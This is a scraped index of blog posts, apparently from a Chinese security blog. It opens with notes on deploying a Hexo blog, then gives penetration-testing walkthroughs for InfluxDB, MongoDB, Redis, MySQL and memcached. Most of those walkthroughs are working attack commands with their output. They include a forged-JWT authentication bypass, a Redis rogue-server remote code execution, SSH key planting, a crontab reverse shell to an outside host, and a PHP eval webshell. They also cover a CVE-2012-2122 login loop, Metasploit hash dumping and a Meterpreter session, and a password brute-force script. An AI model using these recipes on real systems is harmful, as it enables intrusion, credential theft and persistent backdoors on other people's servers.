4 5 6 7  cd Mr-Framework \u0026amp;\u0026amp; git init #进入博客目录并初始化git git remote add origin https://github.com/askDing/Mr.Framework.git # 添加远程git仓库 git add . \u0026amp;\u0026amp; git commit -m \u0026#34;My Blog Backup\u0026#34; # 初次提交到本地暂缓区 git push --set-upstream origin master # 设置上游分支 git push origin master # 上传到Github hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo d \u0026amp;\u0026amp; git add . \u0026amp;\u0026amp; git commit -m \u0026#34; `date` \u0026#34; \u0026amp;\u0026amp; git push -f # 部署到Github并进行备份   快捷命令  在.zshrc中添加\n 1 2  alias hs=\u0026#39;cd ~/Mr-Framework \u0026amp;\u0026amp; hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo s\u0026#39; # 启动本地服务 alias hdb=\u0026#39;cd ~/Mr-Framework \u0026amp;\u0026amp; hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo d \u0026amp;\u0026amp; git add . \u0026amp;\u0026amp; git commit -m \u0026#34; Mr.Framework updated: `date` \u0026#34; \u0026amp;\u0026amp; git push -f\u0026#39; # 部署到Github并进行备份   Coding部署-1 5. 开启coding pages服务，绑定域名\n如图：\n6. 阿里云添加解析\n这个时候就可以把之前github的解析改成境外，把coding的解析设为默认了。\n7. 去除coding page的跳转广告\ncoding page的一个比较恶心人的地方就是，你只是银牌会员的话，访问会先跳转到一个广告，再到你自己的域名。那么它也给出了消除的办法。右上角切换到coding的旧版界面，默认新版是不行的。然后再来到pages服务这里。\n这里：\n只要你在页面上添加一行文字，写Hosted by Coding Pages，然后点下面的小勾勾，两个工作日内它就会审核通过了。\n1  \u0026lt;p\u0026gt;Hosted by \u0026lt;a href=\u0026#34;https://pages.coding.me\u0026#34; style=\u0026#34;font-weight: bold\u0026#34;\u0026gt;Coding Pages\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;   我的选择是把这一行代码放在主题文件夹/layout/common/footer.ejs里面，也就是本来在页面中看到的页脚部分。\n当然，为了统一，我又在后面加上了and Github哈哈，可以不加。\n1  \u0026lt;p\u0026gt;\u0026lt;span\u0026gt;Hosted by \u0026lt;a href=\u0026#34;https://pages.coding.me\u0026#34; style=\u0026#34;font-weight: bold\u0026#34;\u0026gt;Coding Pages\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt; and \u0026lt;span\u0026gt;\u0026lt;a href=\u0026#34;https://github.com\u0026#34; style=\u0026#34;font-weight: bold\u0026#34;\u0026gt;Github\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt;   这是最终加上去的代码。\n Markdown编辑器配置-Typora Preferences   General\n On Lauch \u0026gt;open custom folder set source of the hexo blog folder Save \u0026amp; Recover \u0026gt; ☑️ Save without asking when switch files on side panel    Apperarance\n Font Size \u0026gt; ☑️ Auto Themes  Open Theme Folder Downloaded from typora      Editor\n Indent Size on Save  Auto ☑️ Pretty indentation Auto Pair  ☑️ Auto pair brackets and quotes ☑️ Auto pair common Markdown syntax Default Copy Behavior  ☑️ Copy Markdown source as plain text          Image\n When Insert ...\n- Copy image to custom folder\n- ../imges\n- ☑️ Apply above rules to local images\n- ☑️ Apply above rules to online images\n- ☑️ User relative path if possible\n- ☑️Auto escape image URL when insert    ","description":"","id":103,"section":"en","tags":[""],"title":"Built Mr.Frame with Hexo and Git","uri":"http://crkmythical.github.io/en/blog/built-mr-frame-with-hexo-and-git/"},{"content":"influxdb 是针对时间戳或时间序列数据进行优化的的开源时序数据库,\n由Go语言编写，广泛应用于存储系统的监控数据、loT行业的实时数据等，处理高写入和高查询负载。\n端口服务\n 8083 Web admin管理服务端口 8086 HTTP API的端口 8088 集群端口 9096 中继端口   InfluxDB 1.x HTTP 端点\n    Endpoint Description     /debug/pprof Generate profiles for troubleshooting   /debug/requests Track HTTP client requests to the /write and /query endpoints   /debug/vars Collect internal InfluxDB statistics   /ping Check the status of your InfluxDB instance and your version of InfluxDB   /query Query data using InfluxQL, manage databases, retention policies, and users   /write Write data to a database    信息收集 1 2 3 4 5 6 7 8 9 10 11  sudo nmap -sV -Pn -T4 -sSU -p 8086 -sC 10.199.18.8 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 16:31 CST Nmap scan report for 10.199.18.8 Host is up (0.057s latency). PORT STATE SERVICE VERSION 8086/tcp open http InfluxDB http admin 1.2.4 |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). 8086/udp open|filtered d-s-n Nmap done: 1 IP address (1 host up) scanned in 113.41 seconds   debug调试信息泄漏\nhttp://10.199.18.7:8086/debug/vars http://10.199.18.7:8086/debug/pprof/heap http://10.199.18.7:8086/debug/pprof/goroutine http://10.199.18.7:8086/debug/pprof/goroutine?debug=1 http://10.199.18.7:8086/debug/pprof/block http://10.199.18.7:8086/debug/pprof/profile http://10.199.18.7:8086/debug/pprof/threadcreate influxdb认证绕过漏洞 InfluxDB使用jwt作为鉴权方式。\n在用户开启了认证，但未设置参数shared-secret的情况下，JWT token shared-secret 默认为空，\n此时攻击者可以伪造任意用户身份在influxdb中执行SQL语句。\ncurl命令复现  服务器未配置身份认证时可直接进行数据库相关操作\n 1 2 3 4 5  curl \u0026#34;http://10.199.18.7:8086/debug/requests\u0026#34; curl -G \u0026#39;http://10.199.18.7:8086/query\u0026#39; --data-urlencode \u0026#39;q=show users\u0026#39; # 服务器未配置认证可直接查询 {\u0026#34;results\u0026#34;:[{\u0026#34;statement_id\u0026#34;:0,\u0026#34;series\u0026#34;:[{\u0026#34;columns\u0026#34;:[\u0026#34;user\u0026#34;,\u0026#34;admin\u0026#34;]}]}]} curl -G \u0026#39;http://10.199.18.7:8086/query\u0026#39; --data-urlencode \u0026#39;q=show databases\u0026#39; # 查询数据库 {\u0026#34;results\u0026#34;:[{\u0026#34;statement_id\u0026#34;:0,\u0026#34;series\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;databases\u0026#34;,\u0026#34;columns\u0026#34;:[\u0026#34;name\u0026#34;],\u0026#34;values\u0026#34;:[[\u0026#34;gnocchi\u0026#34;],[\u0026#34;_internal\u0026#34;],[\u0026#34;test11\u0026#34;]]}]}]}    服务器配置身份认证，但JWT token shared-secret 默认为空时\n 构造JWT Token\n发送POC\n1 2 3 4 5 6  curl -G \u0026#39;http://xxx:8086/query\u0026#39; -v \\ \t--data-urlencode \u0026#39;q=show users\u0026#39; \\  -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNTU5Mjg0OTM1fQ.tUClNot9LgStSw57n26DSn-3NPkBiHizk-XOHMfJJJw\u0026#39; # output {\u0026#34;results\u0026#34;:[{\u0026#34;statement_id\u0026#34;:0,\u0026#34;series\u0026#34;:[{\u0026#34;columns\u0026#34;:[\u0026#34;user\u0026#34;,\u0026#34;admin\u0026#34;],\u0026#34;values\u0026#34;:[[\u0026#34;admin\u0026#34;,true],[\u0026#34;read\u0026#34;,false],[\u0026#34;write\u0026#34;,false],[\u0026#34;telegraf\u0026#34;,true]]}]}]}   BurpSuite复现 1 2 3 4 5 6 7 8 9 10 11 12  POST /query HTTP/1.1 Host: your-ip Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjc2MzQ2MjY3fQ.NPhb55F0tpsp5X5vcN_IkAAGDfNzV5BA6M4AThhxz6A User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 22 q=show%20users   MSF相关模块利用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  msf6 auxiliary(scanner/http/influxdb_enum) \u0026gt; show options Module options (auxiliary/scanner/http/influxdb_enum): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD root yes The password to login with Proxies no A proxy chain of format type:host:port[,type:host:port][...] QUERY SHOW DATABASES yes The influxdb query syntax RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 8086 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path to list all the databases USERNAME root yes The username to login as VHOST no HTTP server virtual host msf6 auxiliary(scanner/http/influxdb_enum) \u0026gt; set rhosts 10.199.18.7 rhosts =\u0026gt; 10.199.18.7 msf6 auxiliary(scanner/http/influxdb_enum) \u0026gt; run [*] Running module against 10.199.18.7 [+] 10.199.18.7:8086 - Influx Version: 1.2.4 [+] File saved in: /Users/ethan/.msf4/loot/20201202195840_default_10.199.18.7_influxdb.enum_380609.txt [*] Auxiliary module execution completed   ","description":"","id":104,"section":"en","tags":[""],"title":"InfluxDB","uri":"http://crkmythical.github.io/en/blog/influxdb/"},{"content":"MongoDB 是一个由C++语言编写,\n基于分布式文件存储的数据库,\n旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。\n介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。\n信息收集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  sudo nmap -sV -Pn -T4 -sSU -p 27017 --script mongodb-databases 10.196.20.1 PORT STATE SERVICE VERSION 27017/tcp open mongodb MongoDB 3.6.12 | mongodb-databases: | totalSize = 2633728.0 | databases | 0 | empty = false | name = admin | sizeOnDisk = 131072.0 | 1 | empty = false | name = config | sizeOnDisk = 86016.0 | mongodb-info: | MongoDB Build info | javascriptEngine = mozjs | buildEnvironment | cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14 | linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro | cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0 | target_os = linux | target_arch = x86_64 | ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp | cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0 | distmod = ubuntu1604 | distarch = x86_64 | gitVersion = c2b9acad0248ca06b14ef1640734b5d0595b55f1 | bits = 64 | maxBsonObjectSize = 16777216 | debug = false   MongoDB未授权访问 开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。\n造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 \u0026ndash;auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。\nMongoDB客户端探测 1 2  mongo 10.196.20.1:27017 mongodb\u0026gt;show dbs   MSF模块利用 MSF登陆模块mongodb_login 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  msf6 auxiliary(scanner/mongodb/mongodb_login) \u0026gt; show options Module options (auxiliary/scanner/mongodb/mongodb_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB admin yes Database to use DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no A specific password to authenticate with PASS_FILE no File containing passwords, one per line RHOSTS 10.196.20.1 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 27017 yes The target port (TCP) STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE no File containing usernames, one per line VERBOSE true yes Whether to print output for all attempts msf6 auxiliary(scanner/mongodb/mongodb_login) \u0026gt; run [*] 10.196.20.1:27017 - Scanning IP: 10.196.20.1 [+] 10.196.20.1:27017 - Mongo server 10.196.20.1 doesn\u0026#39;t use authentication [*] 10.196.20.1:27017 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed   漏洞修复  修改默认端口 禁止开发服务到公网\nbind_ip=127.0.0.1 禁用HTTP和REST端口 为MongoDB添加认证\n添加--auth参数  ","description":"","id":105,"section":"en","tags":[""],"title":"MongoDB","uri":"http://crkmythical.github.io/en/blog/mongodb/"},{"content":"REmote DIctionary Server(Redis) 是一个开源的Key-Value数据存储系统，使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型，并提供多种语言的API。\n信息收集 1 2 3 4 5 6 7 8 9 10  sudo nmap -sV -Pn -T4 -sSU -p 6379,26379 -sC 192.168.79.207 Host is up (0.00014s latency). PORT STATE SERVICE VERSION 6379/tcp open redis Redis key-value store 4.0.14 26379/tcp closed unknown 6379/udp closed unknown 26379/udp closed unknown Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds   Redis未授权访问 （1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；\n（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。\nredis-rogue-getshell复现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ./redis-master.py -r 192.168.79.207 -p 6379 -L 10.211.55.13 -P 4444 -f RedisModulesSDK/exp.so -c \u0026#34;id\u0026#34; \u0026gt;\u0026gt; send data: b\u0026#39;*3\\r\\n$7\\r\\nSLAVEOF\\r\\n$12\\r\\n10.211.55.13\\r\\n$4\\r\\n4444\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;+OK\\r\\n\u0026#39; \u0026gt;\u0026gt; send data: b\u0026#39;*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$6\\r\\nexp.so\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;+OK\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;PING\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;REPLCONF listening-port 6379\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;REPLCONF capa eof capa psync2\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;PSYNC 971afdf273239115adec6f02cc8f8b85a90c25bd 1\\r\\n\u0026#39; \u0026gt;\u0026gt; send data: b\u0026#39;*3\\r\\n$6\\r\\nMODULE\\r\\n$4\\r\\nLOAD\\r\\n$8\\r\\n./exp.so\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;+OK\\r\\n\u0026#39; \u0026gt;\u0026gt; send data: b\u0026#39;*3\\r\\n$7\\r\\nSLAVEOF\\r\\n$2\\r\\nNO\\r\\n$3\\r\\nONE\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;+OK\\r\\n\u0026#39; \u0026gt;\u0026gt; send data: b\u0026#39;*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$8\\r\\ndump.rdb\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;+OK\\r\\n\u0026#39; \u0026gt;\u0026gt; send data: b\u0026#39;*2\\r\\n$11\\r\\nsystem.exec\\r\\n$2\\r\\nid\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;$49\\r\\neuid=999(redis) gid=999(redis) groups=999(redis)\\n\\r\\n\u0026#39; euid=999(redis) gid=999(redis) groups=999(redis) \u0026gt;\u0026gt; send data: b\u0026#39;*3\\r\\n$6\\r\\nMODULE\\r\\n$6\\r\\nUNLOAD\\r\\n$6\\r\\nsystem\\r\\n\u0026#39; \u0026gt;\u0026gt; receive data: b\u0026#39;+OK\\r\\n\u0026#39;   MSF相关模块  scanner/redis/redis_server\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  msf6 auxiliary(scanner/redis/redis_server) \u0026gt; options Module options (auxiliary/scanner/redis/redis_server): Name Current Setting Required Description ---- --------------- -------- ----------- COMMAND INFO yes The Redis command to run PASSWORD foobared no Redis password for authentication test RHOSTS 192.168.79.207 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 6379 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/redis/redis_server) \u0026gt; run [+] 192.168.79.207:6379 - Found redis with INFO command: $2701\\x0d\\x0a# Server\\x0d\\x0aredis_version:4.0.14\\x0d\\x0aredis_git_sha1:00000000\\x0d\\x0aredis_git_dirty:0\\x0d\\x0aredis_build_id:3914f9509eb3b682\\x0d\\x0aredis_mode:standalone\\x0d\\x0aos:Linux 5.4.39-linuxkit x86_64\\x0d\\x0aarch_bits:64\\x0d\\x0amultiplexing_api:epoll\\x0d\\x0aatomicvar_api:atomic-builtin\\x0d\\x0agcc_version:6.3.0\\x0d\\x0aprocess_id:1\\x0d\\x0arun_id:dffdc0223004bf2ccbcb29dd56d35a30c9645059\\x0d\\x0atcp_port:6379\\x0d\\x0auptime_in_seconds:1612\\x0d\\x0auptime_in_days:0\\x0d\\x0ahz:10\\x0d\\x0alru_clock:13240592\\x0d\\x0aexecutable:/data/redis-server\\x0d\\x0aconfig_file:\\x0d\\x0a\\x0d\\x0a# Clients\\x0d\\x0aconnected_clients:1\\x0d\\x0aclient_longest_output_list:0\\x0d\\x0aclient_biggest_input_buf:0\\x0d\\x0ablocked_clients:0\\x0d\\x0a\\x0d\\x0a# Memory\\x0d\\x0aused_memory:849288\\x0d\\x0aused_memory_human:829.38K\\x0d\\x0aused_memory_rss:4186112\\x0d\\x0aused_memory_rss_human:3.99M\\x0d\\x0aused_memory_peak:869304\\x0d\\x0aused_memory_peak_human:848.93K\\x0d\\x0aused_memory_peak_perc:97.70%\\x0d\\x0aused_memory_overhead:836126\\x0d\\x0aused_memory_startup:786488\\x0d\\x0aused_memory_dataset:13162\\x0d\\x0aused_memory_dataset_perc:20.96%\\x0d\\x0atotal_system_memory:2083606528\\x0d\\x0atotal_system_memory_human:1.94G\\x0d\\x0aused_memory_lua:37888\\x0d\\x0aused_memory_lua_human:37.00K\\x0d\\x0amaxmemory:0\\x0d\\x0amaxmemory_human:0B\\x0d\\x0amaxmemory_policy:noeviction\\x0d\\x0amem_fragmentation_ratio:4.93\\x0d\\x0amem_allocator:jemalloc-4.0.3\\x0d\\x0aactive_defrag_running:0\\x0d\\x0alazyfree_pending_objects:0\\x0d\\x0a\\x0d\\x0a# CPU\\x0d\\x0aused_cpu_sys:2.00\\x0d\\x0aused_cpu_user:0.80\\x0d\\x0aused_cpu_sys_children:0.09\\x0d\\x0aused_cpu_user_children:0.00\\x0d\\x0a\\x0d\\x0a# Cluster\\x0d\\x0acluster_enabled:0\\x0d\\x0a\\x0d\\x0a# Keyspace [*] 192.168.79.207:6379 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed    linux/redis/redis_replication_cmd_exec\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  msf6 exploit(linux/redis/redis_replication_cmd_exec) \u0026gt; options Module options (exploit/linux/redis/redis_replication_cmd_exec): Name Current Setting Required Description ---- --------------- -------- ----------- CUSTOM true yes Whether compile payload file during exploiting PASSWORD foobared no Redis password for authentication test RHOSTS 192.168.79.207 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 6379 yes The target port (TCP) SRVHOST 10.211.55.13 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 6379 yes The local port to listen on. Payload options (linux/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.211.55.13 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port msf6 exploit(linux/redis/redis_replication_cmd_exec) \u0026gt; run [*] Started reverse TCP handler on 10.211.55.13:4444 [*] 192.168.79.207:6379 - Compile redis module extension file [+] 192.168.79.207:6379 - Payload generated successfully! [*] 192.168.79.207:6379 - Listening on 10.211.55.13:6379 [*] 192.168.79.207:6379 - Rogue server close... [*] 192.168.79.207:6379 - Sending command to trigger payload. [*] Sending stage (3008420 bytes) to 10.211.55.2 [*] Meterpreter session 1 opened (10.211.55.13:4444 -\u0026gt; 10.211.55.2:59293) at 2020-12-04 04:56:34 -0500 [!] 192.168.79.207:6379 - This exploit may require manual cleanup of \u0026#39;./wjkka.so\u0026#39; on the target meterpreter \u0026gt;   利用ssh公钥登陆Redis服务器 在本地生成公私钥文件 1  ssh-keygen -t rsa   将公钥写入foo.txt文件 1 2 3 4 5  (echo -e \u0026#34; \u0026#34;; cat /root/.ssh/id_rsa.pub; echo -e \u0026#34; \u0026#34;) \u0026gt; foo.txt   将公钥写入redis服务器 1 2 3 4 5 6 7 8 9 10 11  $ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit $ redis-cli -h 192.168.1.11 $ 192.168.1.11:6379\u0026gt; config set dir /root/.ssh/ OK $ 192.168.1.11:6379\u0026gt; config get dir 1) \u0026#34;dir\u0026#34; 2) \u0026#34;/root/.ssh\u0026#34; $ 192.168.1.11:6379\u0026gt; config set dbfilename \u0026#34;authorized_keys\u0026#34; OK $ 192.168.1.11:6379\u0026gt; save OK   登陆Redis服务器 1  ssh -i id_rsa root@192.168.1.11   利用crontab反弹shell 1 2 3 4 5 6 7 8 9  redis-cli -h 192.168.0.104 set xxx \u0026#34; */1 * * * * /bin/bash -i\u0026gt;\u0026amp;/dev/tcp/192.168.0.104/4444 0\u0026gt;\u0026amp;1 \u0026#34; config set dir /var/spool/cron config set dbfilename root save   利用Redis写入webshell 生成webshell.php脚本 1 2 3 4 5 6  \u0026lt;?php set_time_limit(0); $fp=fopen(\u0026#39;bmjoker.php\u0026#39;,\u0026#39;w\u0026#39;); fwrite($fp,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;pass\u0026#34;]);?\u0026gt;\u0026#39;); exit(); ?\u0026gt;   将webshell.php前后空2行 1 2 3 4 5  ( echo -e \u0026#34; \u0026#34;; cat webshell.php ; echo -e \u0026#34; \u0026#34;) \u0026gt; webshell.txt   将webshell文件写入redis服务器中 1 2 3 4 5 6 7 8 9 10 11  $ cat webshell.txt | redis-cli -h 192.168.1.11 -x set crackit $ redis-cli -h 192.168.1.11 $ 192.168.1.11:6379\u0026gt; config set dir /var/www/html/ OK $ 192.168.1.11:6379\u0026gt; config get dir 1) \u0026#34;dir\u0026#34; 2) \u0026#34;/var/www/html/\u0026#34; $ 192.168.1.11:6379\u0026gt; config set dbfilename \u0026#34;webshell.php\u0026#34; OK $ 192.168.1.11:6379\u0026gt; save OK   使用behind/antsword等客户端连接\n测试是否存在未授权或弱口令的小脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  #! /usr/bin/env python # _*_ coding:utf-8 _*_ import socket import sys PASSWORD_DIC=[\u0026#39;redis\u0026#39;,\u0026#39;root\u0026#39;,\u0026#39;oracle\u0026#39;,\u0026#39;password\u0026#39;,\u0026#39;p@aaw0rd\u0026#39;,\u0026#39;abc123!\u0026#39;,\u0026#39;123456\u0026#39;,\u0026#39;admin\u0026#39;] def check(ip, port, timeout): try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(\u0026#34;INFO \u0026#34;) result = s.recv(1024) if \u0026#34;redis_version\u0026#34; in result: return u\u0026#34;未授权访问\u0026#34; elif \u0026#34;Authentication\u0026#34; in result: for pass_ in PASSWORD_DIC: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(\u0026#34;AUTH %s \u0026#34; %(pass_)) result = s.recv(1024) if \u0026#39;+OK\u0026#39; in result: return u\u0026#34;存在弱口令，密码：%s\u0026#34; % (pass_) except Exception, e: pass if __name__ == \u0026#39;__main__\u0026#39;: ip=sys.argv[1] port=sys.argv[2] print check(ip,port, timeout=10)   ","description":"","id":106,"section":"en","tags":[""],"title":"Redis","uri":"http://crkmythical.github.io/en/blog/redis/"},{"content":"信息收集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  sudo nmap -sV -Pn -T4 -sSU -p 3306 -sC 192.168.79.207 Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:28 CST Nmap scan report for 192.168.79.207 Host is up (0.00013s latency). PORT STATE SERVICE VERSION 3306/tcp open mysql MySQL 5.5.23 | mysql-info: | Protocol: 10 | Version: 5.5.23 | Thread ID: 2 | Capabilities flags: 63487 | Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, SupportsCompression, LongPassword, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, IgnoreSigpipes, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults | Status: Autocommit | Salt: \u0026lt;~\u0026#39;EdI|Z*b0d,Ly\u0026gt;hpy2 |_ Auth Plugin Name: mysql_native_password 3306/udp closed mysql Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds   MySQL认证绕过漏洞 CVE-2012-2122 当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。\n也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。\nbash脚本利用  在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录\n  for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2\u0026gt;/dev/null; done Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 603 Server version: 5.5.23 Source distribution Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql\u0026gt; MSF利用  mysql_authbypass_hashdump\n $ msfconsole msf \u0026gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdump msf auxiliary(mysql_authbypass_hashdump) \u0026gt; set USERNAME root msf auxiliary(mysql_authbypass_hashdump) \u0026gt; set RHOSTS 127.0.0.1 msf auxiliary(mysql_authbypass_hashdump) \u0026gt; run [+] 127.0.0.1:3306 The server allows logins, proceeding with bypass test [*] 127.0.0.1:3306 Authentication bypass is 10% complete [*] 127.0.0.1:3306 Authentication bypass is 20% complete [*] 127.0.0.1:3306 Successfully bypassed authentication after 205 attempts [+] 127.0.0.1:3306 Successful exploited the authentication bypass flaw, dumping hashes... [+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D [+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D [+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D [+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D [+] 127.0.0.1:3306 Saving HashString as Loot: debian-sys-maint:*C59FFB311C358B4EFD4F0B82D9A03CBD77DC7C89 [*] 127.0.0.1:3306 Hash Table has been saved: 20120611013537_default_127.0.0.1_mysql.hashes_889573.txt [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed ","description":"","id":107,"section":"en","tags":[""],"title":"MySQL","uri":"http://crkmythical.github.io/en/blog/mysql/"},{"content":"memcached是一套分布式的高速缓存系统。\n它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。\n由于memcached安全设计缺陷，客户端连接memcached服务器后无需认证就可读取、修改服务器缓存内容。\n信息收集 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  sudo nmap -Pn -T4 -sV -p 11211 --script memcached-info 10.198.18.1 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 15:39 CST Nmap scan report for 10.198.18.1 Host is up (0.11s latency). PORT STATE SERVICE VERSION 11211/tcp open memcached Memcached 1.5.12 (uptime 363416 seconds) | memcached-info: | Process ID: 268842 | Uptime: 363417 seconds | Server time: 2020-11-27T07:39:06 | Architecture: 64 bit | Used CPU (user): 245.883293 | Used CPU (system): 676.125332 | Current connections: 2057 | Total connections: 786483 | Maximum connections: 65535 | TCP Port: 11211 | UDP Port: 0 |_ Authentication: no Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds   Memcache数据库未授权访问  登录机器执行netstat -an 